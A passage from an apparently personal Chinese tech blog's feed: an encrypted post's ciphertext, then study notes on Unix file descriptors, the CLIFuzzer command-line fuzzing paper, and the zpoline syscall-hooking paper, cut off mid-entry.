2f4cc9ee789cab4c8877c8211b468357307d40312cafa738567db71a16f79b24d00ac268ce5c0b3b19d411a8f784d03284365068991729765ad4340f87d8c5721b49aa9136f7abd4df6668db9d20650bf75737d81ee3637d8897721037fdd7725450ad5d0da139b980d128496a311260ac5041aba8e2984bda811f6b6282c9c9b86a64ba364fad01ed9e6a17241d3c2755226f7cf6460860a6f4a53abeade6c002a516edf4a19ec4d74b5bfbe15959c625521857e93bec90d228e36db3afb20ab7a4c6217f76e0dbfd0a6a2b9e596c4df66a77b794d842b221a69111f9adf3d648f6ba47a182729a67cd20670981ff85129f406d17840dd4d89608009fe45a6ea776ac91ec84a1900774c2c42c4eeec2514231b3090267c5c40389ee93e1d777edc4d691155dc963a33da7b3a5a58f8d9f3b61cc6cd2587c6ccbe4e7dd413bfeb13a65ca46d9dd28e4a0fc7517fc977407956819ee38b9baa700b297fa8b476f388bf6ee0f46c7ea15be46714b833ecb4246867115b92a3d2ebc4c501b4e0cf281be502c90570cfd01f97a488e8d433a80914762a723a297fb7e0dd090c6af585f7468a6b86341072c31fd9208dcb91d14f0fb48d0c363fde12cd32005056c33adb5667456a95663632eca91a4a9ea167e6d9a8672c33172e5ec455946ecd9f8a49a377646168539e3de3f265171f771c357614c417c40206d16cadeb75064de5ac36c82f828581fb016987057fc552e275201d09331c135e9b951c743d49514725b661f326b123cc10c1ebf485321972f7ccc982b42982286157d32c4e4dda1bcb6e7753de1ac342530e93dbbced1c62f00ee0ea135edd2057d293eac6c0d1e879a519ac2374c59d995718b6afa8d7120f867587c7ee049fbacb735582d84bf31c7945d121245c554139d19274ad6f952197e983e06e1d5efc24eb2d301ad75f93f72918d7d47254cdce171e45110ae11e4a56fd06cae6eb91e71b3710730ab9b23e8179ed4d089de61e5051f59ba8176c43508e9b456cd2d00c9cef6a91f5161d3384d673f183790a05f92e323c4f298b1b59652354a61a4dbe2e0fe910a24165865c0d47e513fa4b343aef6240ef9e31d928eff3346d74fc08971a5ba0d3834ba89c1643db1b863c69743f17ac58452864aed4be813cd342020bcb647856a3e2b5350d3816525a7b0c6e7064172400be5d26b1f0823988f923129b5902b825b9fd5c1576c5965f6fb24a7d3abe70dde6270dab2d4ca2ec9f3ecc665fcf10adc1efa752364314604815774911f113b8310973e24b5f058454f4a0becf2e319ab7b97a972f144114a2021a9b9a1c57e67cb6f1d55da771074df9e268280be5d62af6760093a396eee22dbb484b66085aad8135eeeda7ecbfa668439d0c2ffaf637200e3305bea94a020dd460f0cf304b42e7d5609b7e7c30e3ffe620070e54573e84f924d6d62cbb5d671c4a7b914f68605a0be1378efe10d10ec2fdf5003ab26849cbe43ce6b2f13388e584671d61ccc5d4493f03c724aafeb0c9207c0d554801c320a6b2be224431f71389a53aec340dad15c0ae41d91aa71d599e3e2771cb6f99b8dcc7d753b5e5ab1a18bf28720c475a2d0de2f97016db3fb945ce9ff144f7a222497ef807516df65f35a12e8c3893f23adae6ad1255274afbb38d31adcaedfb9624b379fbce24b9d4084176b536188fe303ab7ee46761f0107f6640813248bc3ef6d8aaa68beae9afee2165506ca3aa08da404a2671122230499b29ab52c35852a769df283f2ed2598aed4638af0c701576d0d82dda784fa21a660e3acfc71b42564d1f65f474d7e19d250d8bfe4a116129ba78af4bfa01cd56ce9588797da57d559f5490f67c02d69b5a6359861fc6b75f143d6fd13e3675b9a7f5021d49bb601c8f782863b1eb3661c5aea788308c045d2e1d79344a0f8c66173f149ab4144e67689d810f7b9428c61efa76fb1b33c6a424c7ec82cd4dbe410fda5c16ec9791b2ab0d50c8477c06d3064428a22f6ea91978d098251de70e8dd651e391e610a42baa5ee1d124bc3121da48b23d718119f82a5bc7ae83bcfd298f975e1705da37013ffbe4c1e34bc218979298d9771dba63d429bba06921fdd032bf35dfb81958e014e9b81f5ba4d5e7f2da7f3ac43bcdf124c8f347a7ed1e81fd64be0d291acad14e0e9effac799590232c7e1ce4808fed21d5f6c2d8c90d7a7fbc35b78438a1f12ff0b8245330071765d4e07fca3c802411d5ba6644b21b3e0c37ec2ad1f863844e6d4ef83dd10dde0b685e69a16e5d6819cb636d19ebbeaaf3051fdaa23f1fb04d588b7ebb710b3f086353b0e78a39c058d5fda10a73f077dff7b63e2530be6c9006171ce300b8266de4acb49e442c9109cf6e21443d262688dec60b1e1f8ceb320fdc4af2a316b8714d89a7e91e328b5ffb27372b7b51b44f8e5e0d7f37720c055441afd8b21dc3fe77e5d9cc8a4a120caabae7b23c0771ac5fefe6d219c5135d5d55fd030931039863c06dc216ef0cd7b9b5a902cf44398f93ac34c7f2ddce5f0ec2f0c84d51aba4fed52a694aba9e415d5a522286eb4afb983125adf900313be5a76e4b09ff0de1d040f634653cf1e645a56cae63e2829437ff62aa1695683d76f1990991cfdd494064088374fd87dc5e4607fdba601d7a92fe40c0714a9e351abb5dee63e36202a88024ca4b0eb49226c25027cf1351e0a0d53e4197309d2ac1a31429d679fbb5ed117ceab9d4e88f55bf93f1bb33e4aba4dc788fcec79354ba22e02e145a9170ca6e3f69f707936fca7b60fc83568a9bb7fb5420bc58fbac9133a36e5037069bba92d70a3f4078c0d3b5e8c4580c0ff214e2421963b65a2787acccb401bb5280b4b449ac9aaf84b9ea8c53104e9ceae1a6e543406ac6be462f5940d250a2f767efc621dcea2387d8d72645abbc46592ead88a33d7cb33f01fceacbd21b954ee2a9a33b950d0b2d890dafad9a5fafe5c7c06f019a7d3343be32e381cb8b127d9543d57babbd9189235869a1ab89eeff3196191c781c2ad05ec61435d2fa1ddd91935c83b615880399ee34f228a321dba4dbc2ce60cec14d5b9db236558ff66c50919e9c59ab89eee04263897dc71876da0938ef1732fc8c63c10fd58d60d9b83a732be24d3bacbec0fbb7364eeba928a66d18450699428db149ea3f4663009d15123658a44624483999c9fa9ca0279c835f93e27b5883eafba0db8aa976798eff4f64ccd251898fefe659d6a134cabf764026e3b6588af64a1ed61be8d2b1caa8a160140686feb239589bb762d983fa3835af55bd8816ef99fe70e7ae4634f766e9e02e093b50087df67265111b3f4bd50428d0fe8a9ed042e8157d8b15394691d3d36b64b98192f8ebad32e6622e7f5601a489cc144d15d5363baa6caf1a32bf01558ecd94c9832a88705434d72b02fda87d9effa59132e6d859adac799474c822a8d6b2ec74843e6c706</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Computer-Science-from-the-Bottom-Up-Note-1</title>
    <link href="https://wd-2711.tech/2023/09/14/Computer-Science-from-the-Bottom-Up-Note-1/"/>
    <id>https://wd-2711.tech/2023/09/14/Computer-Science-from-the-Bottom-Up-Note-1/</id>
    <published>2023-09-14T15:25:40.000Z</published>
    <updated>2023-10-13T09:49:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Computer-Science-from-the-Bottom-Up-Notes-1"><a href="#Computer-Science-from-the-Bottom-Up-Notes-1" class="headerlink" title="Computer Science from the Bottom Up Notes-1"></a>Computer Science from the Bottom Up Notes-1</h1><p>&emsp;看到一本很好的书，<a href="https://bottomupcs.com/index.html">链接</a>，感觉对自己的安全基础很有帮助。</p><span id="more"></span><h2 id="General-Unix-and-Advanced-C"><a href="#General-Unix-and-Advanced-C" class="headerlink" title="General Unix and Advanced C"></a>General Unix and Advanced C</h2><p>&emsp;Linux 或 BSD 等类 UNIX 系统的原则：一切皆文件。</p><h3 id="抽象与API实现"><a href="#抽象与API实现" class="headerlink" title="抽象与API实现"></a>抽象与API实现</h3><p>&emsp;Linux源码中经常出现，如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 需要实现的 API */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">greet_api</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span> (*say_hello)(<span class="type">char</span> *name);</span><br><span class="line"><span class="built_in">int</span> (*say_goodbye)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">say_hello_fn</span><span class="params">(<span class="type">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">say_goodbye_fn</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 实现 API 的结构 */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">greet_api</span> greet_api =</span><br><span class="line">&#123;</span><br><span class="line">.say_hello = say_hello_fn,</span><br><span class="line">.say_goodbye = say_goodbye_fn</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">greet_api.<span class="built_in">say_hello</span>(argv[<span class="number">1</span>]);</span><br><span class="line">greet_api.<span class="built_in">say_goodbye</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p, %p, %p\n&quot;</span>, greet_api.say_hello, say_hello_fn, &amp;say_hello_fn);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;在来看一个例子virtio.h：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">virtio_driver</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">device_driver</span> driver;</span><br><span class="line">        <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">virtio_device_id</span> *id_table;</span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *feature_table;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> feature_table_size;</span><br><span class="line">        <span class="built_in">int</span> (*probe)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*scan)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*remove)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*config_changed)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PM</span></span><br><span class="line">        <span class="built_in">int</span> (*freeze)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">int</span> (*restore)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;这与上方的greet_api是类似的，都写了期望提供的函数。<strong>UNIX平台的标准库一般被称为libc。它提供了系统的基本接口：read()、write()和printf()等基本调用，这个API由一个名为POSIX的规范完整描述。</strong></p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>&emsp;每个运行的程序开始时都有三个已经打开的文件：标准输入、标准输出、标准错误。</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013134721266.png" alt="image-20231013134721266" style="zoom:67%;" /></p><p>&emsp;打开文件使用open API，其返回<code>文件描述符</code>，本质上是<code>内核存储的文件描述符表的索引</code>。内核创建<code>文件描述符</code>以响应open调用，并将<code>文件描述符</code>与<code>底层类似文件的对象的某种抽象</code>相关联，该对象可以是实际的硬件设备、文件系统。操作系统要求程序员创建设备驱动程序，以便能够与硬件设备通信，设备驱动提供了由内核调用的一系列函数。如下图所示：<code>驱动程序提供了一个read write函数，驱动程序知道如何将这些通用请求转换为特定设备的特定请求</code>。</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013135901371.png" alt="image-20231013135901371" style="zoom:67%;" /></p><p>&emsp;内核通过称为<code>设备层</code>的东西提供了文件接口。主机上的物理设备由特殊文件系统<code>/dev</code>中的文件表示。设备节点有主要和次要编号（<code>/dev/null</code>、<code>/dev/zero</code>、<code>/dev/tty</code>），这允许内核将特定节点与底层驱动程序相关联。</p><p>&emsp;当文件被打开时，内核使用路径信息将文件描述符映射到提供读写功能的东西上，具体而言，文件描述符会定位到挂载点，挂载点下打开的文件可以被定向到系统文件驱动程序。</p><p>&emsp;<code>理解内核就是理解API是如何相互关联和共存的</code>。</p><p>&emsp;shell例如bash、zsh、csh，它们可以帮助用户与操作系统交互。一些shell数据传递方式如下：</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013174154191.png" alt="image-20231013174154191" style="zoom:67%;" /></p><p>&emsp;例如<code>ls|more</code>，其不是将标准输出的文件描述符与某种底层设备（如控制台，用于输出到终端）相关联，而是将描述符指向内核提供的内存缓冲区，通常称为管道。</p><h2 id="Binary-and-Number-Representation"><a href="#Binary-and-Number-Representation" class="headerlink" title="Binary and Number Representation"></a>Binary and Number Representation</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Computer-Science-from-the-Bottom-Up-Notes-1&quot;&gt;&lt;a href=&quot;#Computer-Science-from-the-Bottom-Up-Notes-1&quot; class=&quot;headerlink&quot; title=&quot;Computer Science from the Bottom Up Notes-1&quot;&gt;&lt;/a&gt;Computer Science from the Bottom Up Notes-1&lt;/h1&gt;&lt;p&gt;&amp;emsp;看到一本很好的书，&lt;a href=&quot;https://bottomupcs.com/index.html&quot;&gt;链接&lt;/a&gt;，感觉对自己的安全基础很有帮助。&lt;/p&gt;</summary>
    
    
    
    <category term="cs-books" scheme="https://wd-2711.tech/categories/cs-books/"/>
    
    
  </entry>
  
  <entry>
    <title>CLIFuzzer</title>
    <link href="https://wd-2711.tech/2023/09/14/CLIFuzzer/"/>
    <id>https://wd-2711.tech/2023/09/14/CLIFuzzer/</id>
    <published>2023-09-14T02:32:24.000Z</published>
    <updated>2023-09-14T15:16:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CLIFuzzer：命令行调用的挖掘语法"><a href="#CLIFuzzer：命令行调用的挖掘语法" class="headerlink" title="CLIFuzzer：命令行调用的挖掘语法"></a>CLIFuzzer：命令行调用的挖掘语法</h1><p>&emsp;很多程序都靠命令行来传递选项和参数，因此要对这些程序做测试，需要遍历所有的命令行选项。CLIFuzzer使用动态分析来跟踪输入，并自动提取参数，我们可以变换不同的输入参数，生成无穷的随机参数列表，对程序进行模糊测试，提高代码覆盖率。</p><span id="more"></span><p>&emsp;注：与之很相似的有基于变异的fuzzer，它通过对输入数据进行随机变异和扰动来寻找软件的异常行为。这种模糊测试方法基于以下假设：在输入数据中的细微变化和异常情况可能会引发软件中的漏洞。</p><p>&emsp;命令行程序输入参数的格式为<code>$&lt;程序名&gt; &lt;parameter&gt;*</code>。其中，<code>&lt;parameter&gt;</code>要么为参数名，例如<code>-v|-a</code>，要么为参数值，例如<code>1.txt</code>等。目前，已经有很多研究关注于命令行程序，其局限性在于：<strong>只测试标准输入</strong>，即要么忽略程序接受的不同选项，要么只用特定的选项序列。还有的研究通过分析<code>--help</code>来获得选项集，但是<code>--help</code>选项可能不存在。</p><p>&emsp;而CLIFuzzer可以从代码中自动确定选项列表，这基于一个假设：大多数的程序使用类似于<code>getopt()</code>之类的选项parser。在本论文中，主要是针对python的argparse进行原型设计，以创建命令行参数的语法。进一步地，我们将上述原型转为针对C语言的，使用<code>getopt()</code>来进行模糊测试的fuzzer。但是，<code>getopt()</code>无法获得选项类型，因此，我们通过跟踪运行时库函数（<code>runtime library function</code>）来获得选项类型。最终，CLIFuzzer获得了能准确描述程序参数的一套语法，如下所示，<code>ls</code>命令的语法为：</p><p><img src="/images/CLIFuzzer/image-20230914110731000.png" alt="image-20230914110731000" style="zoom:67%;" /></p><p>&emsp;CLIFuzzer利用这套语法创建无穷的命令行序列，来测试程序。</p><h2 id="getopt-函数"><a href="#getopt-函数" class="headerlink" title="getopt()函数"></a><code>getopt()</code>函数</h2><p>&emsp;标准C语言库函数parse命令行主要用<code>getopt | getopt_long | getopt_long_only</code>函数。这些函数中的两个参数定义可能的选项：</p><p>（1）<code>optstring</code>。保存程序的短选项（例如<code>-a</code>）。举个例子，<code>optstring=&quot;1ac:d::&quot;</code>，这代表一个短选项列表，见<a href="https://www.cnblogs.com/yhjoker/p/13873739.html">链接</a>。选项类型分为3种：（a）不带值的参数，其定义就是参数本身；（b）必须带值的参数，在定义后加<code>:</code>；（c）可选值的参数，在定义后加<code>::</code>。其表示语法如下（其中<code>&lt;prefix&gt;</code>不知道是什么？）：</p><p><img src="/images/CLIFuzzer/image-20230914113111507.png" alt="image-20230914113111507" style="zoom:67%;" /></p><p>（2）<code>longopts</code>。指向选项结构体的指针，描述了程序接受的长选项。从结构体为：</p><p><img src="/images/CLIFuzzer/image-20230914121158381.png" alt="image-20230914121158381" style="zoom:67%;" /></p><h2 id="参数规范分析"><a href="#参数规范分析" class="headerlink" title="参数规范分析"></a>参数规范分析</h2><p>&emsp;此节的目的是生成参数语法。其步骤为：（1）将选项字符串转为上下文无关的语法。（2）将选项参数转为谓词。（3）参数到谓词。（看不太明白，接着向下看）</p><h3 id="从选项规范（optstring、longopts）构建语法"><a href="#从选项规范（optstring、longopts）构建语法" class="headerlink" title="从选项规范（optstring、longopts）构建语法"></a>从选项规范（optstring、longopts）构建语法</h3><p>&emsp;此步骤将短选项与长选项规范转为上下文无关的语法。我们将<code>getopt</code>函数更改，从而记录参数。更改后的<code>getopt</code>被加入到共享库中，并重写<code>LD_PRELOAD</code>环境变量，以加载此共享库。</p><p>&emsp;一旦CLIFuzzer提取到了<code>optstring</code>，就会用如下算法将短选项转为语法。</p><p><img src="/images/CLIFuzzer/image-20230914123616739.png" alt="image-20230914123616739" style="zoom:67%;" /></p><p>&emsp;上述算法中，首先检查<code>optstring</code>是否以<code>&#39;-&#39;</code>开头。如果是，则表明该程序接受任何未指定的选项字母，而不会立即出现错误，这部分在第 2 节中详细描述。因此，我们将<code>-&lt;letter&gt;</code>附加到上下文无关语法中。如果<code>optstring</code>以<code>:</code>或<code>+</code>开头，它将影响向程序指示缺失参数的方式，具体见<a href="https://www.cnblogs.com/yhjoker/p/13873739.html">链接</a>。然而，它对选项规范没有直接影响，因此跳过。<code>longopts</code>不需要parse，直接转为语法即可。</p><h3 id="挖掘选项参数类型"><a href="#挖掘选项参数类型" class="headerlink" title="挖掘选项参数类型"></a>挖掘选项参数类型</h3><p>&emsp;CLIFuzzer扫描<code>libc</code>，以找寻需要参数的函数。它重写每一个<code>libc</code>的函数，以便调用这些函数时会记录参数。CLIFuzzer使用每个选项的随机参数来调用被测程序（如何理解？），举个例子，如果文件名为参数，那么程序可能会调用<code>open|stat</code>函数；如果以整数为参数，那么程序可能调用<code>atoi|strtol</code>函数；如果以浮点数为参数，那么程序可能调用<code>atof|strtod</code>。</p><h3 id="参数的谓词"><a href="#参数的谓词" class="headerlink" title="参数的谓词"></a>参数的谓词</h3><p>&emsp;最后一步就是找到参数要满足的条件（谓词）（理解的不一定对）。<strong>因此，使用多个参数来调用实用程序来确定程序需要多少个参数。</strong></p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><p>&emsp;程序最起码有一个文件输入，保证完全随机性。选项个数平均数为27，代码量平均为1w行。以AFL++为基线，当程序具有大量有效选项时，CLIFuzzer的覆盖范围明显优于AFL++，因为选项不是AFL++模糊测试过程的一部分。当程序没有有效选项（什么叫有效选项？）时，CLIFuzzer与AFL++的覆盖率相当。但是，CLIFuzzer并不能找到col程序中的crash部分，因为这需要特定字符作为输入，但是AFL++可以，这是因为它的目标就是更高的代码覆盖率。</p><p>&emsp;突然感觉fuzzer的目的是让程序崩溃？</p><p>&emsp;举几个CLIFuzzer找到的崩溃点：</p><p>（1）<code>bison</code>（接受一个上下文无关语法规范作为输入，并生成一个解析器，用于分析输入的语法结构）：当运行<code>bison --trace s1</code>时，会挂起。其中，<code>--trace</code>选项并未在使用文档中提到。</p><p>（2）<code>tac</code>（反向输出）：当运行<code>tac --separator=.+5 --regex E.coli</code>时会挂起，程序会卡在<code>regexec.c</code>中，其中<code>csplit|expr|nl</code>中也调用了此文件，因此猜测这些指令中可能也会出现这种毛病。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><p>&emsp;AFL（Americal Fuzzy Lop）主要关注<code>stdin</code>与文件输入，不太关注参数输入。相关变体有<code>AFLGo|AFL++</code>。</p><p>&emsp;<code>AFL++</code>中有一个<strong>实验性的参数fuzz</strong>，但是并不是专门针对创建选项，因此用处不大。<code>RIDDLE</code><strong>利用程序的一些选项（通过语法）</strong>来进行fuzz（不知道和CLIFuzzer的区别）。iFUZZ则需要用户主动提供<code>getopt()</code>中的<code>optstring</code>参数。Wang等人在在CLI程序上<strong>选择某些引导模糊测试的选项</strong>，其具体目标是最大化覆盖率，选项在Protobuf中指定为语法，并指导模糊测试工具进行fuzz。Lee首先从程序文档中提取了一组选项，之后他们确定了最大化覆盖率的选项子集，这些选项用于构造十个调用字符串，然后用于对程序进行模糊测试，在此期间，仅输入文件发生变化。与CLIFuzzer相比，上述所有方法都需要一定的人力来推断完整的命令行调用（感觉优势不是很明显）。</p><h2 id="论文代码"><a href="#论文代码" class="headerlink" title="论文代码"></a>论文代码</h2><p><a href="https://github.com/vrthra/fse2022-clifuzzer">https://github.com/vrthra/fse2022-clifuzzer</a></p><p>To be continued…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CLIFuzzer：命令行调用的挖掘语法&quot;&gt;&lt;a href=&quot;#CLIFuzzer：命令行调用的挖掘语法&quot; class=&quot;headerlink&quot; title=&quot;CLIFuzzer：命令行调用的挖掘语法&quot;&gt;&lt;/a&gt;CLIFuzzer：命令行调用的挖掘语法&lt;/h1&gt;&lt;p&gt;&amp;emsp;很多程序都靠命令行来传递选项和参数，因此要对这些程序做测试，需要遍历所有的命令行选项。CLIFuzzer使用动态分析来跟踪输入，并自动提取参数，我们可以变换不同的输入参数，生成无穷的随机参数列表，对程序进行模糊测试，提高代码覆盖率。&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>zpoline</title>
    <link href="https://wd-2711.tech/2023/09/07/zpoline/"/>
    <id>https://wd-2711.tech/2023/09/07/zpoline/</id>
    <published>2023-09-07T00:41:41.000Z</published>
    <updated>2023-09-14T02:21:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zpoline：基于二进制重写的系统调用钩子机制"><a href="#zpoline：基于二进制重写的系统调用钩子机制" class="headerlink" title="zpoline：基于二进制重写的系统调用钩子机制"></a>zpoline：基于二进制重写的系统调用钩子机制</h1><p>&emsp;优势：钩子开销低、不会覆盖不应修改的指令、无需更改内核（什么意思？）、不需要用户态程序的源代码、不需要依赖特定的标准库、可用于系统调用仿真、详尽的钩子（exhaustive hooking）。</p><span id="more"></span><p>&emsp;主要难点在于：<strong>很难用 <code>jmp/call</code> 替换 <code>syscall/sysenter</code> 来跳转到任意钩子函数，因为 <code>syscall</code> 和 <code>sysenter</code> 是两字节指令，并且通常需要更多字节来指定任意钩子函数地址。</strong></p><p>&emsp;zpoline用两字节 <code>callq *%rax</code> 指令替换了 <code>syscall/sysenter</code>，并在虚拟地址 0 处实例化了 Trampoline 代码。与现有机制相比，zpoline 的开销降低了 <code>28.1~761.0</code> 倍，现有机制确保了详尽的钩子、不覆盖不应修改的指令。由 zpoline 绑定的 Redis 和用户态网络与传统机制相比，性能仅降低了 <code>5.2%</code>，而现有机制会降低 <code>72.3%~98.8%</code> 的性能。</p><p>&emsp;由于用户态程序总是通过系统调用来执行重要操作，因此系统调用钩子可以成为跟踪和更改程序行为的有效位置。因此，此钩子可以用在trace、沙箱、OS仿真、新操作系统子系统的二进制兼容性支持中。很多研究表明，由内核旁路框架（<code>kernel-bypass frameworks</code>）支持的用户空间操作系统子系统性能很优秀。原则上，系统调用钩子使我们能够透明地将用户态OS子系统应用到遗留软件工件（<code>legacy software artifacts</code>），并且透明度是用户态OS子系统适用性的重要因素（不太懂）。</p><p>&emsp;注：</p><ul><li>用户态OS子系统是运行在用户空间中的操作系统组件或服务。</li><li><code>exhaustive hooking（详尽的钩子）</code>是一种对内核进行全面钩子的技术，允许用户空间程序对内核的各个部分进行监控和操作。这种技术使得用户空间程序可以拦截和修改内核的函数调用、系统调用、中断处理等操作。</li></ul><p>&emsp;现有的系统调用钩子有：</p><p>（1）<code>Syscall User Dispatch (SUD)</code>、<code>int3</code>的传统二进制重写、现有内核支持等技术，会导致极大的性能下降。</p><p>（2）二进制重写技术如<code>instruction punning</code>、<code>E9Patch</code>，函数调用替换（<code>LD_PRELOAD</code>）不能达到<code>详尽的钩子</code>这样一个目标（为什么？），因此不能用于需要可靠性的系统。</p><p>（3）二进制重写技术如<code>Detours</code>只能重写不该被修改的指令。</p><p>（4）针对内核的特定修改如<code>Dune</code>是硬件的不同，应用程序很难移植到上面。</p><p>（5）需要重新编译源代码，例如<code>Unikernel</code>，不太实用，很多情况下无法访问程序源代码。</p><p>（6）链接经过修改的<code>libc</code>，将系统调用替换为特定OS子系统的函数调用，无法钩取所有的调用，且无法钩取发生在外部标准库中的系统调用。</p><p>（7）<code>BPF/eBPF</code>允许用户钩取内核态函数，它们不能在没有修改内核源代码的同时模拟系统调用。</p><p>&emsp;注：</p><ul><li><code>syscall</code> 和 <code>sysenter</code> 这两个字节指令（分别为 <code>0x0f 0x05</code> 和 <code>0x0f 0x34</code>）。</li><li>系统调用的原理：当用户态程序执行<code>syscall/sysenter</code>时，上下文会切换到内核，然后系统调用处理程序。为了切换到内核，执行特定的系统调用，用户态程序在触发系统调用前将系统调用号（例如，0 表示读取，1 表示写入，2 表示打开）存放到到<code>rax</code>，在内核中，系统调用处理程序根据<code>rax</code>寄存器的值执行其中一个系统调用。</li></ul><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>&emsp;在本文中，将<code>syscall/sysenter</code>用<code>callq *%rax(0xff 0xd0)</code>代替，其中<code>*</code>表示间接引用，即访问<code>%rax</code>寄存器中的值所指向的地址。为什么不用<code>callq *%rax</code>？这是因为它仅占1字节。正常情况下，<code>rax</code>存放的是系统调用号，因此，此指令会跳转到虚拟地址<code>0-&gt;500</code>。</p><p>&emsp;<strong>要重定向到用户定义的钩子函数，zpoline 在虚拟地址 0 处实例化了 Trampoline 代码（即0到最大系统调用数之间的虚拟地址被单字节<code>nop</code>指令填充），并且在最后一个<code>nop</code>指令后，有一段跳转到特定钩子函数的代码。</strong></p><p>&emsp;在trampoline代码实例化和二进制重写完成后，重写的部分（<code>callq *%rax</code>）将跳转到trampoline代码中的<code>nop</code>之一，同时将调用者的地址压入堆栈。执行会向下滑动后续的<code>nop</code>；执行完最后一个<code>nop</code>后，跳转到钩子函数。这里，钩子函数将具有与内核空间系统调用处理程序相同的寄存器状态。最后，钩子函数的返回跳转回<code>callq *%rax</code>压入栈的调用者地址。</p><p><img src="/images/zpoline/image-20230908112203755.png" alt="image-20230908112203755" style="zoom:67%;" /></p><p>&emsp;注：zpoline 本身并不提供安全增强功能。如果用户希望提高zpoline应用系统的安全性，可以采用现有的机制。例如，<code>seccomp</code>可以过滤由 zpoline 的用户空间程序触发的内核空间系统调用的执行，而 CPU 支持（例如内存保护密钥MPK）可以隔离钩子函数的实现。</p><h2 id="0x01-实现过程"><a href="#0x01-实现过程" class="headerlink" title="0x01 实现过程"></a>0x01 